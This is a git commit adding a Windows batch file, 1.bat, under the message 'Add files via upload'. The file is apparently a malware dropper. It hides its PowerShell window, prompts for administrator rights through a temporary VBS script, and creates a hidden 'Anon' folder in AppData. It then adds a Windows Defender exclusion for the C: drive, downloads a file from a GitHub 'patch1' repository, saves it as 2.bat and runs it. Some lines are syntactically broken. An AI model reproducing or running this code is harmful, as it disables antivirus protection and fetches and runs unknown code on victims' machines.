ab6f23ff17a26badf2930a22c7b0d94b4eced1eb
xstrong <167684811+xst4@users.noreply.github.com>
2024-05-02 22:01:56 +0300

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,38 @@
+ÿþ
+cls
+
+@echo off
+
+powershell -window hidden -command ""
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+cd "C:\Users\%USERNAME%\AppData\Local"
+mkdir "Anon"
+attrib +h "Anon" /s /d
+
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
+
+Powershell -Command "Invoke-Webrequest 'https://github.com/xst4/patch1/raw/main/2.ex' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
+cd C:\Users\%USERNAME%\AppData\Local\Anon"
+start 2.bat
